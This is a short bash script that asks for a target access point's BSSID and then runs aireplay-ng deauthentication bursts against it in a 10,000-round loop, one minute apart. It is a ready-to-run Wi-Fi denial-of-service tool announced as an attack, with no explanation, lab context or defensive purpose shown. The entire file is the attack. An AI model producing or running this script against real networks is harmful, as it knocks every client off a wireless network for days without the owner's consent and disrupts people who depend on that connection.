echo "                                                          Enter your target's BSSID:"
read bssid
echo
echo "                                                          Starting attack..."
echo
for i in {1..10000}
 do
  aireplay-ng --deauth 100 -a $bssid wlan0mon
 sleep 60s
done
exit
